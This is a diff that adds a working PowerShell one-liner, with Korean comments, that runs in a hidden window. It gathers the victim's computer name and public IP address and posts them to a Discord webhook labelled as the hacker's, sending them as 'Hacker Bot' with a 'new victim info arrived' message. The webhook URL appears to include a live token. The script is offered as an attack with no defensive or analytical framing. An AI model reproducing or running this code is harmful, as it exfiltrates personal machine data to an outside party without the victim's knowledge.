@@ -1,0 +1,18 @@
+powershell -nop -w hidden -c "
+    # 1. 해커의 디스코드 웹훅 주소 (예시)
+    $WebhookURL = 'https://discord.com/api/webhooks/1467331557290152204/8BA_qcr4s5pAy2WIJ_8FuimfLwiTEcS0zLR_J266RJMRy-XEu2U5M-XRXdAlhYslpNok';
+
+    # 2. 내 컴퓨터에서 훔치고 싶은 정보 수집
+    $Content = @{
+        username = 'Hacker Bot';
+        content = '새로운 희생자 정보 도착!';
+        embeds = @(@{
+            title = 'System Info';
+            description = 'PC 이름: ' + $env:COMPUTERNAME + ' | IP: ' + (Invoke-RestMethod 'https://api.ipify.org');
+            color = 16711680; # 빨간색
+        })
+    } | ConvertTo-Json;
+
+    # 3. 디스코드 웹훅으로 정보 전송
+    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Content -ContentType 'application/json';
+"
